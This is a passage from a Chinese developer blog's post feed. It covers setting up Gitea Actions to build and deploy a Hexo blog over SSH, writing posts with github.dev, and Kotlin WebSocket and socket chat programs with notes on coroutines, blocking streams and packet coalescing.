<span class="string">./config.yaml:/config.yaml</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">./data:/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br></pre></td></tr></table></figure>

<p>然后你就可以看到你这边已经存在了一个全局的<code>runner</code>可以提供使用了<br><img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8gitea-action%E5%AE%9E%E7%8E%B0CICD-2024-12-25-13-45-09.png" alt="使用gitea-action实现CICD-2024-12-25-13-45-09"></p>
<h2 id="添加配置文件"><a href="#添加配置文件" class="headerlink" title="添加配置文件"></a>添加配置文件</h2><p>在你的仓库下面创建一个<code>.gitea/workflows</code>的文件夹。在文件夹下任意创建一个<code>yml</code>配置文件，如下所示：<br><img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8gitea-action%E5%AE%9E%E7%8E%B0CICD-2024-12-25-13-47-16.png" alt="使用gitea-action实现CICD-2024-12-25-13-47-16"><br>具体代码如下：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">Hexo</span> <span class="string">Blog</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span>  <span class="comment"># 或你希望触发部署的分支</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">Code</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&#x27;16&#x27;</span>  <span class="comment"># 请根据你的需求选择 Node.js 版本</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Install</span> <span class="string">Dependencies</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string">          npm install hexo-cli -g          </span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Build</span> <span class="string">Hexo</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">hexo</span> <span class="string">generate</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span> <span class="string">to</span> <span class="string">Server</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">SSH_PRIVATE_KEY:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.SSH_PRIVATE_KEY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">SERVER_USER:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.SERVER_USER</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">SERVER_HOST:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.SERVER_HOST</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">SERVER_PATH:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.SERVER_PATH</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          # 设置 SSH 密钥</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh</span></span><br><span class="line"><span class="string">          echo &quot;$SSH_PRIVATE_KEY&quot; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">          <span class="comment"># 使用 scp 将 public 目录推送到服务器指定路径</span></span><br><span class="line">          <span class="string">scp</span> <span class="string">-o</span> <span class="string">StrictHostKeyChecking=no</span> <span class="string">-o</span> <span class="string">UserKnownHostsFile=/dev/null</span> <span class="string">-r</span> <span class="string">./public/*</span> <span class="string">$SERVER_USER@$SERVER_HOST:$SERVER_PATH</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">          <span class="comment"># 如果你需要删除多余的文件，可以在此添加其他命令来清理旧的内容</span></span><br><span class="line">          <span class="string">ssh</span> <span class="string">-o</span> <span class="string">StrictHostKeyChecking=no</span> <span class="string">$SERVER_USER@$SERVER_HOST</span> <span class="string">&lt;&lt;EOF</span></span><br><span class="line">            <span class="comment"># 进入服务器指定目录</span></span><br><span class="line">            <span class="string">cd</span> <span class="string">$SERVER_PATH</span></span><br><span class="line">            <span class="comment"># 可以在此进行其他操作，如清理过时的文件或配置</span></span><br><span class="line">            <span class="string">echo</span> <span class="string">&quot;Deployment complete&quot;</span></span><br><span class="line">          <span class="string">EOF</span>          </span><br></pre></td></tr></table></figure>

<p>上述代码基本与github actions的语法一致，这里不提供相关的基础概念了。想学习的可以查阅github的官网。(大部分情况下可以通过gpt等ai生成一个样例模板，再自己去写所需要的部分)</p>
<p>上面代码中个别细节需要提及：</p>
<ol>
<li><code>secrets.SSH_PRIVATE_KEY</code>等密钥配置文件是保存在仓库的如下选项中<br> 这与github中的配置也是相似的<br> <img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8gitea-action%E5%AE%9E%E7%8E%B0CICD-2024-12-25-13-51-03.png" alt="使用gitea-action实现CICD-2024-12-25-13-51-03"></li>
<li><code>StrictHostKeyChecking=no</code>用于关闭交互服务(一般使用ssh密钥连接时都是交互式会提示是否接受等概念)<br> <img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8gitea-action%E5%AE%9E%E7%8E%B0CICD-2024-12-25-13-52-32.png" alt="使用gitea-action实现CICD-2024-12-25-13-52-32"></li>
</ol>
<h2 id="nginx页面展示"><a href="#nginx页面展示" class="headerlink" title="nginx页面展示"></a>nginx页面展示</h2><p>也就是你所看到的博客页面啦。这些都是我通过nginx展示出来的。不过关于nginx的具体代码配置我就不在此展开了。我应该会有另外的文章去说明这部分内容。</p>
]]></content>
      <categories>
        <category>本地化服务</category>
      </categories>
      <tags>
        <tag>CICD</tag>
        <tag>gitea</tag>
      </tags>
  </entry>
  <entry>
    <title>使用github.dev写博客</title>
    <url>/posts/b5d9fc79/</url>
    <content><![CDATA[<h1 id="新的体验"><a href="#新的体验" class="headerlink" title="新的体验"></a>新的体验</h1><p>原本使用的博客系统是typecho，现在迁移到hexo来进行编写。<br>如果说非要有什么理由的话，可能是因为服务器要到期了。到时候需要对typecho的配置进行迁移。（主要是服务器多了个php环境。而我刚好不太会php）<br>索性迁移到hexo。进行新博客的书写。同时我也会将我的域名<code>zfxt.top</code>迁移过来。<br>优缺点比较：<br>    他们都可以设置一样的主题，一样的好看。甚至说是一摸一样。<br>typecho胜在。</p>
<ol>
<li><p>可以在线编辑，因为他部署在服务器上，有着admin管理环境，也有单独的数据库。我可以很轻松的在不同的地方，不同的网络。随时随地编写我的博客。</p>
</li>
<li><p>同样他也有一个很方便的地方就是对于图片的上传。他只需要复制，粘贴，便会自动保存到服务器中，然后自动生成对应的markdown代码。我不用考虑图床或者其他的图片保存问题。</p>
</li>
<li><p>他同时也是个很轻量化的应用，占用内存等都比较小 .</p>
</li>
</ol>
<p>而hexo直接就是静态代码。</p>
<ol>
<li>他没有数据库，所有的信息都是通过md文件保存，这样最大的好处就是很容易迁移，到处迁移，不用担心数据库的结构问题。</li>
<li>同时他也可以轻松的和github一起使用。通过github page直接实现无服务器运行。</li>
<li>缺点就是他没有很方便的图床管理功能和在线编写功能，大部分情况都得本地编写，然后再部署到github上。</li>
<li>作为js写的项目，他当然会更加适用于前端，我也能看懂大部分代码</li>
</ol>
<p>而现在我再考虑的是，使用github.dev和七牛云，来实现更轻便的部署方案（主要是因为我 搞github action搞不太明白。卡报错，网上教程也少，所以就是这样）<br>你现在看到的就是我用github.dev来写博客<br>那么就先到此为止吧<br><img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8github-dev%E5%86%99%E5%8D%9A%E5%AE%A2-2024-03-13-13-06-31.png" alt="使用github-dev写博客-2024-03-13-13-06-31"></p>
]]></content>
      <tags>
        <tag>github</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Kotlin构建WebSocket服务器模板</title>
    <url>/posts/68fef8ae/</url>
    <content><![CDATA[<p>记录一个使用kotlin写WebSocket的常用模板</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> top.zfxt.chat.service</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONArray</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject</span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONUtil</span><br><span class="line"><span class="keyword">import</span> jakarta.websocket.*</span><br><span class="line"><span class="keyword">import</span> jakarta.websocket.server.PathParam</span><br><span class="line"><span class="keyword">import</span> jakarta.websocket.server.ServerEndpoint</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service</span><br><span class="line"><span class="keyword">import</span> top.zfxt.chat.pojo.User</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer</span><br><span class="line"><span class="keyword">import</span> java.util.*</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ConcurrentHashMap</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@author</span>:zfxt</span></span><br><span class="line"><span class="comment"> *  <span class="doctag">@version</span>:1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@ServerEndpoint(<span class="string">&quot;/chat/&#123;username&#125;&quot;</span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">WebSocketServer</span> &#123;</span><br><span class="line">    <span class="keyword">companion</span> <span class="keyword">object</span>&#123;</span><br><span class="line">          <span class="keyword">val</span> UsersMap:MutableMap&lt;String, User?&gt; = mutableMapOf()</span><br><span class="line"></span><br><span class="line">          <span class="keyword">val</span> log = LoggerFactory.getLogger(WebSocketServer.javaClass)</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 记录当前在线人数</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">         <span class="keyword">val</span> sessionMap:MutableMap&lt;String,Session&gt; = ConcurrentHashMap();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 建立成功调用的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@OnOpen</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">fun</span> <span class="title">onOpen</span><span class="params">(session:<span class="type">Session</span>,<span class="meta">@PathParam(<span class="string">&quot;username&quot;</span>)</span> username:<span class="type">String</span>)</span></span>&#123;</span><br><span class="line">        <span class="comment">//让用户上线</span></span><br><span class="line">        <span class="keyword">var</span> newUser: User? = UsersMap.<span class="keyword">get</span>(username)</span><br><span class="line">        newUser?.status = <span class="string">&quot;online&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(newUser==<span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//生成用户信息</span></span><br><span class="line">            <span class="keyword">var</span> userId = UUID.randomUUID().toString().replace(<span class="string">&quot;-&quot;</span>,<span class="string">&quot;&quot;</span>).substring(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line">            newUser = User(userId,username,<span class="literal">null</span>,<span class="string">&quot;online&quot;</span>)</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            UsersMap.put(username,newUser)</span><br><span class="line">            sessionMap.put(username,session)</span><br><span class="line">            log.info(<span class="string">&quot;有新用户加入，username=&#123;&#125;，当前在线人数为：&#123;&#125;&quot;</span>,username, sessionMap.size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> systemMessage = JSONObject().<span class="keyword">set</span>(<span class="string">&quot;isSystem&quot;</span>,<span class="literal">true</span>).<span class="keyword">set</span>(<span class="string">&quot;users&quot;</span>, UsersMap.values)</span><br><span class="line">        sendAllMessage(JSONUtil.toJsonStr(systemMessage))</span><br><span class="line"><span class="comment">//        var result: JSONObject = JSONObject()</span></span><br><span class="line"><span class="comment">//        var array: JSONArray = JSONArray()</span></span><br><span class="line"><span class="comment">//        result.set(&quot;users&quot;,array)</span></span><br><span class="line"><span class="comment">//        for (key in sessionMap.keys)&#123;</span></span><br><span class="line"><span class="comment">//            array.add(JSONObject().set(&quot;username&quot;,key))</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        sendAllMessage(JSONUtil.toJsonStr(result))</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 连接关闭调用的方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@OnClose</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">fun</span> <span class="title">onClose</span><span class="params">(session: <span class="type">Session</span>,<span class="meta">@PathParam(<span class="string">&quot;username&quot;</span>)</span> username: <span class="type">String</span>)</span></span>&#123;</span><br><span class="line">        sessionMap.remove(username)</span><br><span class="line">        UsersMap.remove(username)</span><br><span class="line">        log.info(<span class="string">&quot;有一连接关闭，移除username=&#123;&#125;的用户session，当前在线人数为：&#123;&#125;&quot;</span>,username, sessionMap.size)</span><br><span class="line">        <span class="keyword">var</span> systemMessage = JSONObject().<span class="keyword">set</span>(<span class="string">&quot;isSystem&quot;</span>,<span class="literal">true</span>).<span class="keyword">set</span>(<span class="string">&quot;users&quot;</span>, UsersMap.values)</span><br><span class="line">        sendAllMessage(JSONUtil.toJsonStr(systemMessage))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 收到客户端消息后调用的方法</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> message 客户端发送过来的消息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@OnMessage(maxMessageSize = 1024*1024*10)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">fun</span> <span class="title">onMessage</span><span class="params">(message: <span class="type">String</span>,<span class="meta">@PathParam(<span class="string">&quot;username&quot;</span>)</span> username: <span class="type">String</span>)</span></span>&#123;</span><br><span class="line">        log.info(<span class="string">&quot;服务器收到用户username=&#123;&#125;的消息:&#123;&#125;&quot;</span>,username,message)</span><br><span class="line">        <span class="keyword">var</span> obj = JSONUtil.parseObj(message)</span><br><span class="line">        <span class="keyword">var</span> fromname = obj.getStr(<span class="string">&quot;from&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> toUsername = obj.getStr(<span class="string">&quot;to&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> toSession = sessionMap.<span class="keyword">get</span>(toUsername)</span><br><span class="line">        <span class="keyword">if</span>(toSession != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> message = JSONObject().<span class="keyword">set</span>(<span class="string">&quot;isSystem&quot;</span>,<span class="literal">false</span>).<span class="keyword">set</span>(<span class="string">&quot;message&quot;</span>,obj).toString()</span><br><span class="line">            sendMassage(message,toSession)</span><br><span class="line">            log.info(<span class="string">&quot;用户&#123;&#125;发送给用户username=&#123;&#125;，消息：&#123;&#125;&quot;</span>,fromname,toUsername,message)</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            log.info(<span class="string">&quot;发送失败，未找到用户username=&#123;&#125;的session&quot;</span>,toUsername)</span><br><span class="line">            UsersMap.remove(toUsername)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@OnError</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">fun</span> <span class="title">onError</span><span class="params">(session: <span class="type">Session</span>,error:<span class="type">Throwable</span>)</span></span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;发生错误&quot;</span>)</span><br><span class="line">        error.printStackTrace()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 服务器发送消息给客户端</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">sendMassage</span><span class="params">(message:<span class="type">String</span>,toSession: <span class="type">Session</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            log.info(<span class="string">&quot;服务器给客户端[&#123;&#125;]发送消息&#123;&#125;&quot;</span>,toSession.id,message)</span><br><span class="line">            toSession.basicRemote.sendText(message)</span><br><span class="line">        &#125;<span class="keyword">catch</span> (e:Exception)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;服务器发送消息给客户端失败&quot;</span>,e)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 服务器发送图片给客户端</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">sendImage</span><span class="params">(image:<span class="type">ByteBuffer</span>,toSession: <span class="type">Session</span>)</span></span>&#123;</span><br><span class="line">        toSession.basicRemote.sendBinary(image)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 服务器发送消息给所有客户端</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">sendAllMessage</span><span class="params">(message:<span class="type">String</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(session <span class="keyword">in</span> sessionMap.values)&#123;</span><br><span class="line">                log.info(<span class="string">&quot;服务端给客户端[&#123;&#125;]发送消息&#123;&#125;&quot;</span>,session.id,message)</span><br><span class="line">                session.basicRemote.sendText(message)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (e:Exception)&#123;</span><br><span class="line">            log.error(<span class="string">&quot;服务器发送消息给客户端失败&quot;</span>,e)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>WebSocket</tag>
      </tags>
  </entry>
  <entry>
    <title>使用socket实现一个小型的聊天程序</title>
    <url>/posts/98ed18eb/</url>
    <content><![CDATA[<p>最近在学习使用kotlin，然后试了试用socket实现一个聊天通信功能。然后发现其实kotlin用的很多库都是JAVA中已经存在的。所以更好的使用kotlin不仅要明白kotlin相对于java的优秀特性和他的跨平台能力，还需要对java也有深度的理解。</p>
<h2 id="使用的插件和包"><a href="#使用的插件和包" class="headerlink" title="使用的插件和包:"></a>使用的插件和包:</h2><p>在<code>build.gradle.kts</code>配置文件中配置你所需要的插件和依赖。</p>
<ul>
<li>插件</li>
</ul>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">plugins &#123;</span><br><span class="line">	···</span><br><span class="line">    id(<span class="string">&quot;com.github.johnrengelman.shadow&quot;</span>) version <span class="string">&quot;8.1.1&quot;</span></span><br><span class="line">	···</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tasks.withType&lt;ShadowJar&gt; &#123;</span><br><span class="line">	archiveBaseName.<span class="keyword">set</span>(<span class="string">&quot;myapp&quot;</span>)  <span class="comment">// jar 文件的基本名字</span></span><br><span class="line">	archiveVersion.<span class="keyword">set</span>(<span class="string">&quot;1.0.0&quot;</span>)  <span class="comment">// jar 文件的版本号</span></span><br><span class="line">	archiveClassifier.<span class="keyword">set</span>(<span class="string">&quot;&quot;</span>)  <span class="comment">// jar 文件的额外标签，这里设为空</span></span><br><span class="line">	manifest &#123;</span><br><span class="line">		attributes[<span class="string">&quot;Main-Class&quot;</span>] = <span class="string">&quot;top.zfxt.demo.DemoApplicationKt&quot;</span> <span class="comment">// 设置主类</span></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个shadowJar插件可以编写的帮你打包你的项目所需要的所有依赖。同时你也可以自己编辑那个是主类，以及不包括那些类，和打包后的名字。</p>
<blockquote>
<p>相比于spring自带的bootjar。当你不使用spring时，可能会遇到相关的打包失败问题：如“无法找到主元素清单”等。因此这个插件可以很好的帮助你完成jar包的一键配置</p>
</blockquote>
<ul>
<li>依赖<figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    testImplementation(kotlin(<span class="string">&quot;test&quot;</span>))</span><br><span class="line">    implementation(<span class="string">&quot;org.jetbrains.kotlinx:kotlinx-coroutines-core:1.7.1&quot;</span>)</span><br><span class="line">    <span class="comment">// https://mvnrepository.com/artifact/cn.hutool/hutool-json</span></span><br><span class="line">    implementation(<span class="string">&quot;cn.hutool:hutool-json:5.8.20&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
这里用到了kotlin的协程库和hutool的json序列化工具。<br>因为我们的聊天程序是可以多用户一起聊天的，所以需要用到多线程，让每个socket连接都可以单独运作。而json序列化则方便将具体类两边传输后，可以方便的获取其中的元素。</li>
</ul>
<h2 id="client"><a href="#client" class="headerlink" title="client"></a>client</h2><ol>
<li>主程序<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span>: Unit = runBlocking &#123;</span><br><span class="line">    login()</span><br><span class="line">    checkInit()</span><br><span class="line">    <span class="type">var</span> <span class="variable">job</span> <span class="operator">=</span> GlobalScope.launch &#123; withContext(Dispatchers.IO) &#123; handleServer() &#125; &#125;</span><br><span class="line">    launch &#123; withContext(Dispatchers.IO) &#123; view(job) &#125; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
其中使用<code>withContext(Dispatchers.IO)</code>方法从线程池里拉起一个新的线程，各线程可以相互独立运行。之间不会相互影响。<br>全局定义一个变量，</li>
<li>login()方法<br>与socket服务器进行连接，并将输入输出流存储到<code>client</code>单例中。</li>
<li>checkInit()<br>用于完成连接后，需要输入一个昵称用作聊天，这个昵称将会被发送到服务器并进行存储，同时也会把这昵称保存在client的单例中。</li>
<li>handleServer()<br>循环接受来自服务器的输入流，如果没有读取到的话，就会阻塞，知道接收到消息才开始启动。</li>
<li>view()<br>用于显示主体界面，用于输入命令，显示框架。<br><img src="https://image.zfxt.top/hexo-blog/%E4%BD%BF%E7%94%A8socket%E5%AE%9E%E7%8E%B0%E4%B8%80%E4%B8%AA%E5%B0%8F%E5%9E%8B%E7%9A%84%E8%81%8A%E5%A4%A9%E7%A8%8B%E5%BA%8F-2023-07-18-04-59.png"></li>
</ol>
<h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">main</span><span class="params">()</span>: Unit = runBlocking &#123;</span><br><span class="line">    println(<span class="string">&quot;服务器已经开启&quot;</span>)</span><br><span class="line">    launch &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            server.apply &#123;</span><br><span class="line">                println(<span class="string">&quot;等待连接&quot;</span>)</span><br><span class="line">                <span class="type">val</span> <span class="variable">client</span> <span class="operator">=</span> withContext(Dispatchers.IO) &#123; server.serversocket.accept() &#125;</span><br><span class="line">                <span class="comment">//使用了 Dispatchers.IO 调度器，将 accept() 操作放在了 IO 线程池中进行，从而避免了阻塞当前的协程。</span></span><br><span class="line">                println(<span class="string">&quot;有新用户连接&quot;</span>)</span><br><span class="line">                launch &#123;</span><br><span class="line">                    withContext(Dispatchers.IO) &#123; handleClient(client) &#125;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他拉起了一个协程，并在协程中拉起一个线程，用于时刻等待是否有新的客户端进行，如果有就接受，并且将这个socket拉起一个新线程并且保持运行。</p>
<ol>
<li>handleClient(client)<br>用于接受客户端的命令，并且保持阻塞状态等待命令的发送。</li>
</ol>
<h2 id="探究细节"><a href="#探究细节" class="headerlink" title="探究细节"></a>探究细节</h2><ol>
<li>协程与线程的区别<br>协程与线程主要区别是它将不再被内核调度，而是交给了程序自己而线程是将自己交给内核调度定义：协程是轻量级线程。 在一个用户线程上可以跑多个协程，这样就提高了单核的利用率。<br>优点：协程占用的资源更少，切换协程时，所需要进行更替而交换的上下文也更少，可以提高单核的利用率。<br>缺点：协程是处于一个线程中，系统是无感知的，所以需要在该线程中阻塞某个协程的话，就需要手工进行调度。<br><strong>就我目前的知识储备，对于会阻塞的程序，我只能通过调用多线程的方法实现</strong><br>例如，在程序中，kotlin提供了从线程池中获取一个线程的方法<code>withContext(Dispatchers.IO)&#123;执行程序&#125;</code>,因为输入流的<code>readLine()</code>，serversocket的<code>accept()</code>方法都是阻塞的，如果使用协程运行他们的话，他们会直接阻塞住所有的程序，所以我在客户端和服务端都选择用<code>withContext(Dispatchers.IO)</code>去拉起一个新线程。</li>
<li>输入流和输出流的接受和阻塞<br>在socket通信中，输入流和输出流都会一致保持开启状态，如果关闭了输入输出流，就会无法重新打开，只能重新启动一个socket连接。而当你进行文字传输时，常用的的方式是使用bufferwriter进行读写操作，kotlin通过扩展函数的方法实现便携的把字节输入输出流转化为缓冲字符输入输出流。</li>
</ol>
<ul>
<li>如果使用bufferreader的readLine方法进行读取操作，那么他需要接受到一个<code>\n</code>以判断读入结束，然后他就会把读入到的内容存到变量中。否则他就会一直读入，处于阻塞状态。这就是为什么我的很多次写入操作都手动加入了”\n”用来表示结束读入符。</li>
<li>如果你读入文件时，常用的读取方法是<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (inputStream.read(buffer).also &#123; bytesRead = it &#125; != -<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// 处理读取到的字节块</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
可是这样子的判断方法是只适用于读取完之后，直接关闭输入输出流，才会读到-1。所以这里可以使用其他的方法，比如说，提前获取他能读取的最大读入值，<code>available()</code>方法可以用于获取可能读取到的最大字节数。你可以通过这个提前获取最大量，然后按量读取，读取完后就结束。例如我程序中的操作：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> len: Int = client.input.read(bytes)</span><br><span class="line">    <span class="keyword">if</span> (len != -<span class="number">1</span>) &#123;</span><br><span class="line">        it.write(bytes, <span class="number">0</span>, len)</span><br><span class="line">        i += len</span><br><span class="line">        <span class="title function_">println</span><span class="params">(<span class="string">&quot;已完成$&#123;i * 1.0 / fileSize&#125;&quot;</span>)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (len != -<span class="number">1</span> &amp;&amp; i &lt; fileSize)</span><br></pre></td></tr></table></figure>
我这里的操作是类似的，通过先确定文件大小<code>fileSize</code>的方式来读取，当读入完成后就结束。<br><strong>但是，有一些问题需要提及</strong><br>在 Java 和 Kotlin 中，available() 方法返回的是输入流中当前可读取的字节数量，而不是限制字节数量的大小。<br>然而，需要注意的是，available() 方法的返回值并不一定代表整个输入流中的可用字节数量，也不保证一次读取就能读取到该数量的字节。它只是表示当前时刻下可以无阻塞地读取的字节数。<br>所以我在程序中，事先把文件大小发过去的。</li>
<li>我这里的操作是因为我用的是字节数组读入的方法。如果你使用一个字节一个字节的读入。那么你也可以设置一个结束的关键词，就像<code>readLine()</code>一样用来结束输入。</li>
</ul>
<ol start="3">
<li>粘包问题<br>如果两次写入socket流时间太接近，他可能会连着一起发送，导致数据无法正确接受。这也就是我在源码中多次使用<code>delay()</code>方法延迟接收的原因。</li>
</ol>
<blockquote>
<p>项目代码在github仓库中，<a href="https://github.com/zfx-t/chat-client">客户端</a>,<a href="https://github.com/zfx-t/chat-server">服务端</a></p>
</blockquote>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>socket</tag>
        <tag>底层源码</tag>
      </tags>
  </entry>
  <entry>
    <title>全局事件总线实现</title>
    <url>/posts/eec3b6c0/</url>
    <content><![CDATA[<h2 id="全局事件总线"><a href="#全局事件总线" class="headerlink" title="全局事件总线"></a>全局事件总线</h2><p><img src="/./o/r/34/987b26e3-cbc5-47bb-aafe-194e0e91bc49/1682055123_image.png" alt="image"></p>
<ol>
<li>初步想法，维系一个全局可以获得的变量，可以直接在<code>main.js</code>中定义一个<code>window.x=&#123;name:hzt&#125;</code>，然后全局都可以通过<code>window.x</code>获得该元素。</li>
